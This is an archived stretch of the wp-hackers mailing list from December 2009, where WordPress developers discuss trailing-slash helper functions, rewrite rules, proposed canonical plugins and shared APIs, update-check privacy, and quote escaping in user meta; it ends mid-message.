References: <0DE22E7F-279A-405C-8CE5-35C295C11B60@newclarity.net>
Message-ID: <8b870c460912072202n5dcd4a43ld62c05022ea48ae4@mail.gmail.com>

Try checking the phpdoc.  For user_trailingslashit:

  20   * Retrieve trailing slash string, if blog set for adding
trailing slashes.
  21   *
  22   * Conditionally adds a trailing slash if the permalink
structure has a trailing
  23   * slash, strips the trailing slash if not. The string is passed
through the
  24   * 'user_trailingslashit' filter. Will remove trailing slash
from string, if
  25   * blog is not set to have them.
  26   *
  27   * @since 2.2.0
  28   * @uses $wp_rewrite
  29   *
  30   * @param $string String a URL with or without a trailing slash.
  31   * @param $type_of_url String the type of URL being considered
(e.g. single, category, etc) for use in the filter.
  32   * @return string
  33   */

For trailingslashit:

1163   * Appends a trailing slash.
1164   *
1165   * Will remove trailing slash if it exists already before adding
a trailing
1166   * slash. This prevents double slashing a string or path.
1167   *
1168   * The primary use of this is for paths and thus should be used
for paths. It is
1169   * not restricted to paths and offers no specific path support.
1170   *
1171   * @since 1.2.0
1172   * @uses untrailingslashit() Unslashes string if it was slashed already.
1173   *
1174   * @param string $string What to add the trailing slash to.
1175   * @return string String with trailing slash added.

From if.website at gmail.com  Tue Dec  8 06:05:07 2009
From: if.website at gmail.com (Austin Matzko)
Date: Tue, 8 Dec 2009 00:05:07 -0600
Subject: [wp-hackers] $wp_rewrite->add_permstruct() vs.
	add_rewrite_rule()
In-Reply-To: <EA543A65-D63F-4A60-A933-B8D045CA2EFE@newclarity.net>
References: <EA543A65-D63F-4A60-A933-B8D045CA2EFE@newclarity.net>
Message-ID: <674b4a3b0912072205l782fe23eoc5b39fb7a442e082@mail.gmail.com>

On Mon, Dec 7, 2009 at 11:50 PM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
> So I've been trying to figure out $wp_rewrite->add_permstruct() vs. add_rewrite_rule() for the past several days. I've been able to get the former to work but not the latter. ?I'm trying to figure out when we would use one and when we would use the other?
>
> It *seems* like using add_permastruct() can get you support or things like custom single_template and that add_rewrite_rule() would require use of template_redirect, but I can't be 100% sure?

I think it boils down to this: add_rewrite_rule() lets you set very
particular rewrite rules: you must specify exactly what you want those
rules to be.

In contrast, whatever you pass to add_permastruct() is just a base
from which WordPress adds a bunch of other stuff, possibly defined by
other plugins, such as pagination rules, endpoints, and the like.

From mikeschinkel at newclarity.net  Tue Dec  8 06:11:54 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 8 Dec 2009 01:11:54 -0500
Subject: [wp-hackers] user_trailingslashit()?
In-Reply-To: <674b4a3b0912072202y6aa83d0fw13e87ea40816d6da@mail.gmail.com>
References: <0DE22E7F-279A-405C-8CE5-35C295C11B60@newclarity.net>
	<674b4a3b0912072202y6aa83d0fw13e87ea40816d6da@mail.gmail.com>
Message-ID: <63F37537-00F3-49EE-A9D5-B50AA2C05AD7@newclarity.net>

Okay, Thanks. 

Maybe I'm just confused by some carelessly written code?  For example, why do this?

>          $link = trailingslashit(get_bloginfo('home')) . str_replace('%pagename%', $post_type['plural'] . '/' . $post->post_name, $permastruct);
>          $link = user_trailingslashit($link);

Why not just:

         $link =user_trailingslashit(get_bloginfo('home')) . str_replace('%pagename%', $post_type['plural'] . '/' . $post->post_name, $permastruct);

-Mike


On Dec 8, 2009, at 1:02 AM, Austin Matzko wrote:

> On Mon, Dec 7, 2009 at 11:57 PM, Mike Schinkel
> <mikeschinkel at newclarity.net> wrote:
>> So here's another question; what exactly is user_trailingslashit() for and how are they supposed to be used?  Google is decidedly *not* my friend here and reading the code does me little better.
> 
> One blog might want the permalink structure to be
> 
> /%year%/%monthnum%/%day%/%postname%/  (trailing slash)
> 
> another might want instead
> 
> /%year%/%monthnum%/%day%/%postname%  (no trailing slash).
> 
> user_trailingslashit() makes whatever URL you pass to it consistent
> with that preference as set in Settings > Permalinks.
> 
> Does that make sense?
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From mikeschinkel at newclarity.net  Tue Dec  8 06:12:46 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 8 Dec 2009 01:12:46 -0500
Subject: [wp-hackers] $wp_rewrite->add_permstruct() vs.
	add_rewrite_rule()
In-Reply-To: <674b4a3b0912072205l782fe23eoc5b39fb7a442e082@mail.gmail.com>
References: <EA543A65-D63F-4A60-A933-B8D045CA2EFE@newclarity.net>
	<674b4a3b0912072205l782fe23eoc5b39fb7a442e082@mail.gmail.com>
Message-ID: <E45B59DD-0152-4764-A393-83DAFD3224DC@newclarity.net>

On Dec 8, 2009, at 1:05 AM, Austin Matzko wrote:
> On Mon, Dec 7, 2009 at 11:50 PM, Mike Schinkel
> <mikeschinkel at newclarity.net> wrote:
>> So I've been trying to figure out $wp_rewrite->add_permstruct() vs. add_rewrite_rule() for the past several days. I've been able to get the former to work but not the latter.  I'm trying to figure out when we would use one and when we would use the other?
>> 
>> It *seems* like using add_permastruct() can get you support or things like custom single_template and that add_rewrite_rule() would require use of template_redirect, but I can't be 100% sure?
> 
> I think it boils down to this: add_rewrite_rule() lets you set very
> particular rewrite rules: you must specify exactly what you want those
> rules to be.
> 
> In contrast, whatever you pass to add_permastruct() is just a base
> from which WordPress adds a bunch of other stuff, possibly defined by
> other plugins, such as pagination rules, endpoints, and the like.

Thanks. I think I'm starting to get my head around it.

-Mike


From m at mullenweg.com  Tue Dec  8 06:20:21 2009
From: m at mullenweg.com (Matt Mullenweg)
Date: Mon, 07 Dec 2009 22:20:21 -0800
Subject: [wp-hackers] Some Left-Field names for Canonical Plugins
In-Reply-To: <D59BC6EA-9013-4F52-9651-2C275C70DC51@newclarity.net>
References: <71ddd7490912071944x6e289edbic8dcb00b6a021e41@mail.gmail.com>	<2979bd660912072051u1b6516c3pa458893d94962cb7@mail.gmail.com>
	<D59BC6EA-9013-4F52-9651-2C275C70DC51@newclarity.net>
Message-ID: <4B1DF025.9050801@mullenweg.com>

On 2009-12-07 9:34 PM, Mike Schinkel wrote:
> What's the purpose for these canonical plugins?

That's spelled out pretty clearly in the blog post:

http://wordpress.org/development/2009/12/canonical-plugins/

> Also, will these canonical plugins be listed in special place in the admin console where there is actually a list of the plugins that can be enabled (so they don't have to be so hard to discover?)

They'll definitely be featured for folks.

> And could some of these canonical plugins offer functionality that is only of use to other plugin authors (i.e. a library of routines) instead of all of them being only with end-user functionality?

A library useful to many plugins should probably be in core, since 
that's what core is for.

> How will these canonical plugins be decided upon?

Developer and user interest.

> Will existing ones be elevated, or will they be all new projects?

Probably a mix of both. If an existing author wants to make their plugin 
canonical they'll be a set of standards they can work toward.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From anacin at gwhatchet.com  Tue Dec  8 06:29:50 2009
From: anacin at gwhatchet.com (Andrew Nacin)
Date: Tue, 8 Dec 2009 01:29:50 -0500
Subject: [wp-hackers] user_trailingslashit()?
In-Reply-To: <63F37537-00F3-49EE-A9D5-B50AA2C05AD7@newclarity.net>
References: <0DE22E7F-279A-405C-8CE5-35C295C11B60@newclarity.net> 
	<674b4a3b0912072202y6aa83d0fw13e87ea40816d6da@mail.gmail.com> 
	<63F37537-00F3-49EE-A9D5-B50AA2C05AD7@newclarity.net>
Message-ID: <8b870c460912072229o63fe7005y5d0f2cb3114766af@mail.gmail.com>

>
> Maybe I'm just confused by some carelessly written code?  For example, why
> do this?
>
> $link = trailingslashit(get_bloginfo('home')) . str_replace('%pagename%',
> $post_type['plural'] . '/' . $post->post_name, $permastruct);
> $link = user_trailingslashit($link);


It's actually carefully written code. In this example, 'home' is
trailing-slashed. (Certain options are always without a slash -- xref:
get_option()) Then, dependent on the user's permalink setting, the entire
link gets a trailing slash.

Why not just:
>
> $link =user_trailingslashit(get_bloginfo('home')) .
> str_replace('%pagename%', $post_type['plural'] . '/' . $post->post_name,
> $permastruct);
>

This is incorrect code. Here, you're misapplying user_trailingslashit, which
is for whether a permalink structure calls for a slash at the end.
get_bloginfo('home') will not return a trailing slash and will need one, but
here, it will only be given one if the permalink structure calls for one.
(And then the user's permalink structure is ignored as to whether a trailing
slash is desired -- I think you get the picture.)

From m at mullenweg.com  Tue Dec  8 06:40:05 2009
From: m at mullenweg.com (Matt Mullenweg)
Date: Mon, 07 Dec 2009 22:40:05 -0800
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <427667db0912062233l20b578b4u565a307c15c2d595@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>
	<2979bd660912062149v583780a2vcec94ec1b7c967c1@mail.gmail.com>
	<427667db0912062233l20b578b4u565a307c15c2d595@mail.gmail.com>
Message-ID: <4B1DF4C5.8050306@mullenweg.com>

On 2009-12-06 10:33 PM, Lynne Pope wrote:
> The reason it was hacked was that the owner didn't know of an update that
> would have protected his site. The reason he didn't know was because he was
> using plugins to prevent update checks - and was only using those because he
> didn't want to send his site URL to WordPress. (Ok, he would have known if
> he had been keeping track of updates externally, but this is a case where
> privacy concerns removed an important feature from WordPress and
> disadvantaged him in the process).

One would imagine if you install a "disable update check" plugin you'd 
be conscious of the responsibility of checking for updates manually.

Even with updates on many people don't update, unfortunately.

There was a different plugin that just hashed the URL but still checked 
for updates, which we recommended for the paranoid.

All in all though, not a high priority. I've never met anyone in person 
who disables update checks.* (Maybe they're scared to come to WordCamps.)

* I have met people who disabled it for clients whose sites they managed 
and were responsible for.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From autremonde75 at gmail.com  Tue Dec  8 06:42:47 2009
From: autremonde75 at gmail.com (Olivier)
Date: Mon, 7 Dec 2009 22:42:47 -0800 (PST)
Subject: [wp-hackers] single quote #039; issue when querying the DB
In-Reply-To: <2979bd660912072101v7b585351pa47a9a1f89f2a731@mail.gmail.com>
References: <aae1bd0e-d442-436e-9b5b-3c3be8da4e9a@j4g2000yqe.googlegroups.com>
	<2979bd660912072101v7b585351pa47a9a1f89f2a731@mail.gmail.com>
Message-ID: <406c59de-ac31-4595-a4c9-68dce3e36a06@s31g2000yqs.googlegroups.com>

@Chris :
I was rather talking of user meta values, not sure if the process is
the same.

I have tried to apply maybe_serialize before performing the query but
no luck, doesn't do anything.

I have also tried to apply maybe_unserialize while getting the data
from the DB, the #39; is kept unchanged and passed on as #39; into the
html code however when I get it back from the post, it is converted
back as a quote and if I apply an esc_html or maybe_serialize, it
doesn't modify it to #39;. The maybe_serialize on the quote doesn't
change it and the esc_html change it to #039;.

@Mark :
I am using WP 2.8.6. Not sure how you have performed the test. Please
try to modify the first_name for instance, you should see what I am
talking about.

Thanks for your help!

From mikeschinkel at newclarity.net  Tue Dec  8 06:45:00 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 8 Dec 2009 01:45:00 -0500
Subject: [wp-hackers] Some Left-Field names for Canonical Plugins
In-Reply-To: <4B1DF025.9050801@mullenweg.com>
References: <71ddd7490912071944x6e289edbic8dcb00b6a021e41@mail.gmail.com>	<2979bd660912072051u1b6516c3pa458893d94962cb7@mail.gmail.com>
	<D59BC6EA-9013-4F52-9651-2C275C70DC51@newclarity.net>
	<4B1DF025.9050801@mullenweg.com>
Message-ID: <615469A2-36AA-43D4-B41B-A288156ABB53@newclarity.net>

On Dec 8, 2009, at 1:20 AM, Matt Mullenweg wrote:
> That's spelled out pretty clearly in the blog post:
> 
> http://wordpress.org/development/2009/12/canonical-plugins/

Thanks Matt for clarifying some of the details.

So for more clarity can I assume that these plugins may be smaller general purpose plugins and not exclusively larger specialty purpose functionality?

(If yes, I will then wonder why they shouldn't just because part of the core?)

>> And could some of these canonical plugins offer functionality that is only of use to other plugin authors (i.e. a library of routines) instead of all of them being only with end-user functionality?
> 
> A library useful to many plugins should probably be in core, since that's what core is for.

From my experience unless core actually uses said functions people don't seem to want to include them.  Thus there becomes a sad grey area for shared infrastructure functionality that isn't needed by core (let's say a library for interfacing Twitter, for example); plugins that need that shared functionality all end up reinventing the wheel.  FWIW.

-Mike 

On Dec 8, 2009, at 1:20 AM, Matt Mullenweg wrote:

> On 2009-12-07 9:34 PM, Mike Schinkel wrote:
>> What's the purpose for these canonical plugins?
> 
> That's spelled out pretty clearly in the blog post:
> 
> http://wordpress.org/development/2009/12/canonical-plugins/
> 
>> Also, will these canonical plugins be listed in special place in the admin console where there is actually a list of the plugins that can be enabled (so they don't have to be so hard to discover?)
> 
> They'll definitely be featured for folks.
> 
>> And could some of these canonical plugins offer functionality that is only of use to other plugin authors (i.e. a library of routines) instead of all of them being only with end-user functionality?
> 
> A library useful to many plugins should probably be in core, since that's what core is for.
> 
>> How will these canonical plugins be decided upon?
> 
> Developer and user interest.
> 
>> Will existing ones be elevated, or will they be all new projects?
> 
> Probably a mix of both. If an existing author wants to make their plugin canonical they'll be a set of standards they can work toward.
> 
> -- 
> Matt Mullenweg
> http://ma.tt | http://wordpress.org | http://automattic.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From mikeschinkel at newclarity.net  Tue Dec  8 07:13:28 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 8 Dec 2009 02:13:28 -0500
Subject: [wp-hackers] user_trailingslashit()?
In-Reply-To: <8b870c460912072229o63fe7005y5d0f2cb3114766af@mail.gmail.com>
References: <0DE22E7F-279A-405C-8CE5-35C295C11B60@newclarity.net>
	<674b4a3b0912072202y6aa83d0fw13e87ea40816d6da@mail.gmail.com>
	<63F37537-00F3-49EE-A9D5-B50AA2C05AD7@newclarity.net>
	<8b870c460912072229o63fe7005y5d0f2cb3114766af@mail.gmail.com>
Message-ID: <DF3FEE7F-3373-4B3D-B1FA-0F817A11648E@newclarity.net>

On Dec 8, 2009, at 1:29 AM, Andrew Nacin wrote:
>> Why not just:
>> 
>> $link =user_trailingslashit(get_bloginfo('home')) .
>> str_replace('%pagename%', $post_type['plural'] . '/' . $post->post_name,
>> $permastruct);
>> 
> 
> This is incorrect code. Here, you're misapplying user_trailingslashit, which
> is for whether a permalink structure calls for a slash at the end.
> get_bloginfo('home') will not return a trailing slash and will need one, but
> here, it will only be given one if the permalink structure calls for one.
> (And then the user's permalink structure is ignored as to whether a trailing
> slash is desired -- I think you get the picture.)

THANK YOU!  I misread the code to be encompassing the full expression and not just get_bloginfo().  It really had be thrown for a loop.

When you are confused by code as I have been by the WP_Rewrite() stuff you forget to check basic assumptions and things trip you up that normally wouldn't.

BTW, I think that's why I would tend to write the code to look something like this:

$root = trailingslashit(get_bloginfo('home'));
$path = str_replace('%pagename%', $post_type['plural'] . '/' . $post->post_name, $permastruct);
$link = user_trailingslashit($root . $path);

That's harder to misread. (I won't said it is as performant; I usually write my code to be understandable even if it's a tiny fraction slower. But I know and respect that understandable code isn't always the first priority.)

-Mike

> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From pete at jointforcestech.com  Tue Dec  8 07:46:41 2009
From: pete at jointforcestech.com (Pete Mall)
Date: Mon, 7 Dec 2009 23:46:41 -0800
Subject: [wp-hackers] Some Left-Field names for Canonical Plugins
In-Reply-To: <615469A2-36AA-43D4-B41B-A288156ABB53@newclarity.net>
References: <71ddd7490912071944x6e289edbic8dcb00b6a021e41@mail.gmail.com> 
	<2979bd660912072051u1b6516c3pa458893d94962cb7@mail.gmail.com> 
	<D59BC6EA-9013-4F52-9651-2C275C70DC51@newclarity.net>
	<4B1DF025.9050801@mullenweg.com> 
	<615469A2-36AA-43D4-B41B-A288156ABB53@newclarity.net>
Message-ID: <7f49e8010912072346h204cdc13gba0ebd858a7bcd6@mail.gmail.com>

I've been working on a Twitter API and Google Data Protocol WordPress Client
Library using WP_Http. It'll take care of the authentication and data
transfer and would be easily extensible. A plugin writer would be able to
use these libraries instead of re-inventing the wheel. If anyone is
interested in contributing to these projects, please reply directly to me.

Cheers!
Pete

On Mon, Dec 7, 2009 at 10:45 PM, Mike Schinkel
<mikeschinkel at newclarity.net>wrote:

> On Dec 8, 2009, at 1:20 AM, Matt Mullenweg wrote:
> > That's spelled out pretty clearly in the blog post:
> >
> > http://wordpress.org/development/2009/12/canonical-plugins/
>
> Thanks Matt for clarifying some of the details.
>
> So for more clarity can I assume that these plugins may be smaller general
> purpose plugins and not exclusively larger specialty purpose functionality?
>
> (If yes, I will then wonder why they shouldn't just because part of the
> core?)
>
> >> And could some of these canonical plugins offer functionality that is
> only of use to other plugin authors (i.e. a library of routines) instead of
> all of them being only with end-user functionality?
> >
> > A library useful to many plugins should probably be in core, since that's
> what core is for.
>
> From my experience unless core actually uses said functions people don't
> seem to want to include them.  Thus there becomes a sad grey area for shared
> infrastructure functionality that isn't needed by core (let's say a library
> for interfacing Twitter, for example); plugins that need that shared
> functionality all end up reinventing the wheel.  FWIW.
>
> -Mike
>
> On Dec 8, 2009, at 1:20 AM, Matt Mullenweg wrote:
>
> > On 2009-12-07 9:34 PM, Mike Schinkel wrote:
> >> What's the purpose for these canonical plugins?
> >
> > That's spelled out pretty clearly in the blog post:
> >
> > http://wordpress.org/development/2009/12/canonical-plugins/
> >
> >> Also, will these canonical plugins be listed in special place in the
> admin console where there is actually a list of the plugins that can be
> enabled (so they don't have to be so hard to discover?)
> >
> > They'll definitely be featured for folks.
> >
> >> And could some of these canonical plugins offer functionality that is
> only of use to other plugin authors (i.e. a library of routines) instead of
> all of them being only with end-user functionality?
> >
> > A library useful to many plugins should probably be in core, since that's
> what core is for.
> >
> >> How will these canonical plugins be decided upon?
> >
> > Developer and user interest.
> >
> >> Will existing ones be elevated, or will they be all new projects?
> >
> > Probably a mix of both. If an existing author wants to make their plugin
> canonical they'll be a set of standards they can work toward.
> >
> > --
> > Matt Mullenweg
> > http://ma.tt | http://wordpress.org | http://automattic.com
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Tue Dec  8 08:11:38 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 8 Dec 2009 03:11:38 -0500
Subject: [wp-hackers] Some Left-Field names for Canonical Plugins
In-Reply-To: <7f49e8010912072346h204cdc13gba0ebd858a7bcd6@mail.gmail.com>
References: <71ddd7490912071944x6e289edbic8dcb00b6a021e41@mail.gmail.com>
	<2979bd660912072051u1b6516c3pa458893d94962cb7@mail.gmail.com>
	<D59BC6EA-9013-4F52-9651-2C275C70DC51@newclarity.net>
	<4B1DF025.9050801@mullenweg.com>
	<615469A2-36AA-43D4-B41B-A288156ABB53@newclarity.net>
	<7f49e8010912072346h204cdc13gba0ebd858a7bcd6@mail.gmail.com>
Message-ID: <86420BEE-429A-4DAB-904B-895E8811F18A@newclarity.net>

On Dec 8, 2009, at 2:46 AM, Pete Mall wrote:
> I've been working on a Twitter API and Google Data Protocol WordPress Client
> Library using WP_Http. It'll take care of the authentication and data
> transfer and would be easily extensible. A plugin writer would be able to
> use these libraries instead of re-inventing the wheel. If anyone is
> interested in contributing to these projects, please reply directly to me.

Thanks Pete,  Perfect example of what I was discussing!

So I'll ask others here, are these types of things appropriate or not appropriate to add to the core?  My guess is that most people on the list will chorus "that doesn't belong in the core!"  That's not my opinion, but am I wrong?

From my perspective it would be much better if there could be one API for plugins to program for these types of things instead of many, especially if there is a need for shared data or layering of functionality.  However, such functionality is a no-mans land for WordPress and it advancement is thus stunted; said functionality doesn't fit in the core by most people's account, "market forces" don't foster its standardized across many plugins and there is nowhere else for it to go.  

To solve this?  One of:
  
1.) Start allowing this kind of stuff into the core,
2.) Support this kind of thing in the new canonical plugins, or 
3.) Add a 3rd entity, like canonical plugins in that they would be an official list without duplication but for APIs instead of end user functionality.

-Mike


From zamoose at gmail.com  Tue Dec  8 12:36:06 2009
From: zamoose at gmail.com (Doug Stewart)
Date: Tue, 8 Dec 2009 07:36:06 -0500
Subject: [wp-hackers] Some Left-Field names for Canonical Plugins
In-Reply-To: <615469A2-36AA-43D4-B41B-A288156ABB53@newclarity.net>
References: <71ddd7490912071944x6e289edbic8dcb00b6a021e41@mail.gmail.com> 
	<2979bd660912072051u1b6516c3pa458893d94962cb7@mail.gmail.com> 
	<D59BC6EA-9013-4F52-9651-2C275C70DC51@newclarity.net>
	<4B1DF025.9050801@mullenweg.com> 
	<615469A2-36AA-43D4-B41B-A288156ABB53@newclarity.net>
Message-ID: <71ddd7490912080436o13a22a90k3e84954ad3970221@mail.gmail.com>

On Tue, Dec 8, 2009 at 1:45 AM, Mike Schinkel
<mikeschinkel at newclarity.net>wrote:

>
> Thanks Matt for clarifying some of the details.
>
> So for more clarity can I assume that these plugins may be smaller general
> purpose plugins and not exclusively larger specialty purpose functionality?
>
> (If yes, I will then wonder why they shouldn't just because part of the
> core?)
>
> >> And could some of these canonical plugins offer functionality that is
> only of use to other plugin authors (i.e. a library of routines) instead of
> all of them being only with end-user functionality?
> >
> > A library useful to many plugins should probably be in core, since that's
> what core is for.
>
> From my experience unless core actually uses said functions people don't
> seem to want to include them.  Thus there becomes a sad grey area for shared
> infrastructure functionality that isn't needed by core (let's say a library
> for interfacing Twitter, for example); plugins that need that shared
> functionality all end up reinventing the wheel.  FWIW.
>
>
Mike:
I'm working from memory here, but when  Canonical plugins were discussed at
WordCamp NYC, your specific two points were addressed.  The three most
commonly-mentioned use cases for a CP were: podcasting, event calendaring
and interfacing with Twitter.  In the case of the last two, there are
literally tens, if not hundreds of plugins currently in the .org repository
that take on Twitter and events in largely similar fashions which wastes
effort on the part of developers (why recode what has already been solved to
a 95% level for your use case? Why not simply contribute your tweaks or
enhancements to the officially-supported Twitter plugin?) AND on the part of
end users ("Okay, which of these Twitter plugins is worth installing? There
are so many of them!"). (Less frequently-mentioned was lifestreaming
apps...)

In the case of podcasting, there has been a single, titanic plugin that has
strode the landscape, crushing all others in its path: podPress. However,
its developer went AWOL a while back and recent upgrades to the core of WP
substantively broke it, which means that any sites using podPress to manage
a podcast could either 1) be safe, secure and upgrade WP OR 2) continue on
an older version of WP and simply HOPE that no one exploited the various and
sundry security issues.  Not a good place to be in for anyone, as each
cracked blog contributes to the impression that WordPress is inherently
insecure.

In each of these cases, the use profile for the plugins is ever-so-slightly
tangential to main line blogging and thus would merely contribute code bloat
and interface cluttering were they to be added to core, at least for users
that don't Twitter, plan events or publish a podcast.

Make sense?

--
-Doug
@zamoose
http://literalbarrage.org/blog/

From zamoose at gmail.com  Tue Dec  8 12:45:37 2009
From: zamoose at gmail.com (Doug Stewart)
Date: Tue, 8 Dec 2009 07:45:37 -0500
Subject: [wp-hackers] Some Left-Field names for Canonical Plugins
In-Reply-To: <71ddd7490912080436o13a22a90k3e84954ad3970221@mail.gmail.com>
References: <71ddd7490912071944x6e289edbic8dcb00b6a021e41@mail.gmail.com> 
	<2979bd660912072051u1b6516c3pa458893d94962cb7@mail.gmail.com> 
	<D59BC6EA-9013-4F52-9651-2C275C70DC51@newclarity.net>
	<4B1DF025.9050801@mullenweg.com> 
	<615469A2-36AA-43D4-B41B-A288156ABB53@newclarity.net>
	<71ddd7490912080436o13a22a90k3e84954ad3970221@mail.gmail.com>
Message-ID: <71ddd7490912080445o2e0cf337r5d8392afe07fb64a@mail.gmail.com>

On Tue, Dec 8, 2009 at 7:36 AM, Doug Stewart <zamoose at gmail.com> wrote:

>
> In each of these cases, the use profile for the plugins is ever-so-slightly
> tangential to main line blogging and thus would merely contribute code bloat
> and interface cluttering were they to be added to core, at least for users
> that don't Twitter, plan events or publish a podcast.
>
>
Replying to myself here, but I think someone could validly ask "Is there a
definition for a plugin that would make it automatically eligible for
Canonical status?", at which point we could set thresholds for star ratings,
number of repetitive plugins in the repo, etc. I personally would be against
setting metrics.

I think the actual best case is far more useful but far more frustrating --
let's call it the Justice-Potter-Stewart-on-pr0n Principle*: "I can't define
a canonical plugin, but I sure know one when I see one (and brother, your
Etsy shopping cart app ain't one"**).


* http://en.wikipedia.org/wiki/Potter_Stewart#cite_note-oyez_stewart-8
** Nothing against the lovely, fair and stupendously talented*** folks that
use Etsy, it's just an example of a niche use case...
*** (Note: anyone appearing on Regretsy is most likely not lovely, fair,
and/or stupendously talented.)
-- 
-Doug
@zamoose
http://literalbarrage.org/blog/

From mikeschinkel at newclarity.net  Tue Dec  8 13:31:03 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 8 Dec 2009 08:31:03 -0500
Subject: [wp-hackers] Some Left-Field names for Canonical Plugins
In-Reply-To: <71ddd7490912080436o13a22a90k3e84954ad3970221@mail.gmail.com>
References: <71ddd7490912071944x6e289edbic8dcb00b6a021e41@mail.gmail.com>
	<2979bd660912072051u1b6516c3pa458893d94962cb7@mail.gmail.com>
	<D59BC6EA-9013-4F52-9651-2C275C70DC51@newclarity.net>
	<4B1DF025.9050801@mullenweg.com>
	<615469A2-36AA-43D4-B41B-A288156ABB53@newclarity.net>
	<71ddd7490912080436o13a22a90k3e84954ad3970221@mail.gmail.com>
Message-ID: <A1236D4C-85C1-4075-8B0B-6FA7F9C0D80E@newclarity.net>


On Dec 8, 2009, at 7:36 AM, Doug Stewart wrote:
> I'm working from memory here, but when  Canonical plugins were discussed at
> WordCamp NYC, your specific two points were addressed.  The three most
> commonly-mentioned use cases for a CP were: podcasting, event calendaring
> and interfacing with Twitter.  In the case of the last two, there are
> literally tens, if not hundreds of plugins currently in the .org repository
> that take on Twitter and events in largely similar fashions which wastes
> effort on the part of developers (why recode what has already been solved to
> a 95% level for your use case? Why not simply contribute your tweaks or
> enhancements to the officially-supported Twitter plugin?) AND on the part of
> end users ("Okay, which of these Twitter plugins is worth installing? There
> are so many of them!").

Sounds like I really missed out by not being at WordCamp NYC!

You hit the nail on the head with those two examples!  I've struggled with both.  There's a definite need for a standard twitter infrastructure and repository for tweets, and a real need for a standard approach to events.  I've struggled with both of them, and still am. (As an aside, my Atlanta Startup Weekend team worked on a project called EventTank.com which, not ironically, is current built on WordPress.)

> In each of these cases, the use profile for the plugins is ever-so-slightly
> tangential to main line blogging and thus would merely contribute code bloat
> and interface cluttering were they to be added to core, at least for users
> that don't Twitter, plan events or publish a podcast.
> 
> Make sense?

Makes perfect sense.  

> I think someone could validly ask "Is there a
> definition for a plugin that would make it automatically eligible for
> Canonical status?", at which point we could set thresholds for star ratings,
> number of repetitive plugins in the repo, etc. I personally would be against
> setting metrics.
> 
> I think the actual best case is far more useful but far more frustrating --
> let's call it the Justice-Potter-Stewart-on-pr0n Principle*: "I can't define
> a canonical plugin, but I sure know one when I see one (and brother, your
> Etsy shopping cart app ain't one"**).

And I'm with you 100% on that too.  (Unless of course we disagreed when we saw one... ;-)

But seriously, what I'm hearing here is not the need for canonical plugins that expose some commonly needed UI but instead the need for optional baseline API functionality. In each of those three cases we don't really need elaborate UI functionality, we need shared infrastructure that plugins can build on.  Downloading tweets is easy, posting tweets is easy, storing tweets in a standard location is easy, and designing functions to load tweets from the database into arrays or objects is easy. OTOH there are a myriad of way to display tweets customized for the site owner and to make tweets in a UI optimized manner. Those latter features should be the realm of the plugin repository and the former should be in the form of standardized yet optional baseline plugins.

Drupal has already crossed this bridge and are solving it with specific APIs which you can find listed in the left sidebar here:  http://drupal.org/node/326.  Drupal's APIs include:

	? Batch API
	? Cache API
	? Contributed APIs
	? Database API
	? Field API
	? File API
	? Form API
	? JavaScript, AJAX, AHAH API
	? Localization API
	? RDF Mapping API
	? Schema API
	? XML-RPC API

WordPress is being stunted as a platform as long as it doesn't address this same need. Not exactly the same APIs but a recognition that there is a need for shared APIs and shared database schema that not everyone will use but that a significant minority will use.  (I'd say "Just add them to core" but then the torches and pitchforks come out with everyone chanting "Don't bloat the core!"  As long as we collectively have such an aversion to adding code that just sits on disk and doesn't run unless it's enabled we need an alternate solution to addressing shared APIs not used by the majority.)

Anyway I have another use case where I could really use standardized baseline functionality: a ratings plugin!  In a project I had the client wanted ratings to visually behave differently than any of the existing plugins and yet the existing plugins were not at all designed to be the baseline for others to modify.  So I wrote just such a ratings plugin designed to be the base of other plugins, mentioned here: http://mikeschinkel.com/wordpress-plugins/

Anyway, these type of plugins beg the question of having one plugin depend on another. If we can get the dependency built into the system, even if the dependencies only work for those optional baseline plugins then it would be a step in the right direction.

JMTCW anyway.

-Mike


From wordpress at santosj.name  Tue Dec  8 14:08:57 2009
From: wordpress at santosj.name (Jacob Santos)
Date: Tue, 08 Dec 2009 08:08:57 -0600
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <427667db0912071813l63fb04e5p13c023687fe9044a@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>
	<2979bd660912062149v583780a2vcec94ec1b7c967c1@mail.gmail.com>
	<427667db0912062233l20b578b4u565a307c15c2d595@mail.gmail.com>
	<2979bd660912062346w49ed439dg357f98f06b43c2d7@mail.gmail.com>
	<427667db0912070036o76a5d337jfa89d0863e3f22a1@mail.gmail.com>
	<4B1D1677.9020608@santosj.name>	<427667db0912071401k74e6ca94tb60e2e94e2e533ed@mail.gmail.com>
	<4B1DA7A8.5040402@santosj.name>
	<427667db0912071813l63fb04e5p13c023687fe9044a@mail.gmail.com>
Message-ID: <4B1E5DF9.8040401@santosj.name>

No, it would not be hard, the problem was never difficulty. One simply 
has to weigh the advantages of sending a small amount of information 
verses having to do things manually. Some bosses are not concern about 
security until their site is turned over and spread out with 9 inches 
pounding the site for all it is worth.

I would say to those people, "Well, what is your concern? WordPress.org 
does not sell the information, and only really uses the information to 
make further decisions based on usage. Some of the information is 
